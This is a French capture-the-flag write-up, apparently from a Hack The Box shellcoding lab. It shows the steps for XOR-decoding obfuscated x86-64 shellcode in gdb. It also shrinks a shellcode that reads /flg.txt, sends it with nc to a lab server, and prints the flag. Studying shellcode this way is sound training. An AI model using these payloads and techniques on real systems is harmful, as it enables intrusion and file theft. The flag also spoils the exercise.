
## Exo 1

Pour désassembler le binaire : 
```bash
objdump -M intel --no-show-raw-insn --no-addresses -d loaded_shellcode
```
- Code original : 
```nasm
_start:
	movabs rax,0xa284ee5c7cde4bd7
	push   rax
	movabs rax,0x935add110510849a
	push   rax
	movabs rax,0x10b29a9dab697500
	push   rax
	movabs rax,0x200ce3eb0d96459a
	push   rax
	movabs rax,0xe64c30e305108462
	push   rax
	movabs rax,0x69cd355c7c3e0c51
	push   rax
	movabs rax,0x65659a2584a185d6
	push   rax
	movabs rax,0x69ff00506c6c5000
	push   rax
	movabs rax,0x3127e434aa505681
	push   rax
	movabs rax,0x6af2a5571e69ff48
	push   rax
	movabs rax,0x6d179aaff20709e6
	push   rax
	movabs rax,0x9ae3f152315bf1c9
	push   rax
	movabs rax,0x373ab4bb0900179a
	push   rax
	movabs rax,0x69751244059aa2a3
	push   rax
	movabs rbx,0x2144d2144d2144d2
```

- Code modifier : (On xor chaque valeur avec la clé rbx)
```nasm
global  _start

section .text
_start:
        mov  rbx,0x2144d2144d2144d2
        mov  rax,0xa284ee5c7cde4bd7
        push rbx
        xor  rbx,rax
        pop  rbx
        push rax
        mov  rax,0x935add110510849a
        push rbx
        xor  rbx,rax
        pop  rbx
        push rax
        mov  rax,0x10b29a9dab697500
        push rbx
        xor  rbx,rax
        pop  rbx
        push rax
        mov  rax,0x200ce3eb0d96459a
        push rbx
        xor  rbx,rax
        pop  rbx
        push rax
        mov  rax,0xe64c30e305108462
        push rbx
        xor  rbx,rax
        pop  rbx
        push rax
        mov  rax,0x69cd355c7c3e0c51
        push rbx
        xor  rbx,rax
        pop  rbx
        push rax
        mov  rax,0x65659a2584a185d6
        push rbx
        xor  rbx,rax
        pop  rbx
        push rax
        mov  rax,0x69ff00506c6c5000
        push rbx
```

- On debug avec gdb et on recup les valeurs une à une :
```
 0x83c03c4831ff0f05
 0xb21e0f054831c048
 0x31f64889e64831d2
 0x14831ff40b70148   ##Ajouter un 0 devant pour compléter 0x014831ff40b70148
 0xc708e2f74831c0b0
 0x4889e748311f4883
 0x44214831c980c104
 0x48bbd244214d14d2
 0x10633620e7711253
 0x4bb677435348bb9a
 0x4c5348bbbf264d34
 0xbba723467c7ab51b
 0x167e66af44215348
 0x4831c05048bbe671
```
- On concatène en partant du bas
```
0x4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05
```

- Run le shellcode décodé
```bash
python3 run_shellcode.py '4831c05048bbe671167e66af44215348bba723467c7ab51b4c5348bbbf264d344bb677435348bb9a10633620e771125348bbd244214d14d244214831c980c1044889e748311f4883c708e2f74831c0b0014831ff40b7014831f64889e64831d2b21e0f054831c04883c03c4831ff0f05'
```


## Exo 2

Pour pouvoir réduire le shellcode en dessous des 50 octets, il fallait réduire la taille des registres, et supprimer la parti permettant un "exit" propre.

- Code original : 
```nasm
global _start

section .text
_start:
    ; push './flg.txt\x00'
    push 0              ; push NULL string terminator
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack

    ; open('rsp', 'O_RDONLY')
    mov rax, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    mov rsi, 0          ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    mov rax, 0          ; read syscall number
    mov rdx, 24         ; size to read
    syscall

    ; write output
    mov rax, 1          ; write syscall
    mov rdi, 1          ; set fd to stdout
    mov rdx, 24         ; size to read
    syscall

    ; exit
    mov rax, 60
    mov rdi, 0
    syscall
```

- Code modifier :
```nasm
global _start

section .text
_start:
    ; push './flg.txt\x00'
    push 0              ; push NULL string terminator
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack

    ; open('rsp', 'O_RDONLY')
    mov rax, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    mov sil, 0          ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    mov al, 0          ; read syscall number
    mov dl, 24         ; size to read
    syscall

    ; write output
    mov al, 1          ; write syscall
    mov dil, 1          ; set fd to stdout
    mov dl, 24         ; size to read
    syscall
```

- On assemble :
```bash
└─[$] <> ./assemblage.sh 3_flag_custom.s
./assemblage.sh : ligne 9 : 18473 Erreur de segmentation  ./${fileName}
```

- On extrait le shellcode
```bash
└─[$] <> python3 extract_shellcode.py 3_flag_custom
6a0048bf2f666c672e74787457b8020000004889e740b6000f05488d374889c7b000b2180f05b00140b701b2180f05
47 bytes - Found NULL byte
```

- On regard un peu à quoi ça ressemble
```bash
└─[$] <> pwn disasm '6a0048bf2f666c672e74787457b8020000004889e740b6000f05488d374889c7b000b2180f05b00140b701b2180f05' -c 'amd64'
   0:    6a 00                    push   0x0
   2:    48 bf 2f 66 6c 67 2e 74 78 74    movabs rdi,  0x7478742e676c662f
   c:    57                       push   rdi
   d:    b8 02 00 00 00           mov    eax,  0x2
  12:    48 89 e7                 mov    rdi,  rsp
  15:    40 b6 00                 mov    sil,  0x0
  18:    0f 05                    syscall
  1a:    48 8d 37                 lea    rsi,  [rdi]
  1d:    48 89 c7                 mov    rdi,  rax
  20:    b0 00                    mov    al,  0x0
  22:    b2 18                    mov    dl,  0x18
  24:    0f 05                    syscall
  26:    b0 01                    mov    al,  0x1
  28:    40 b7 01                 mov    dil,  0x1
  2b:    b2 18                    mov    dl,  0x18
  2d:    0f 05                    syscall
```

- On envoit le shellcode : 
```bash
└─[$] <> nc 94.237.62.117 52502
6a0048bf2f666c672e74787457b8020000004889e740b6000f05488d374889c7b000b2180f05b00140b701b2180f05
HTB{5h3llc0d1ng_g3n1u5}
```

- On récup le flag : HTB{5h3llc0d1ng_g3n1u5}

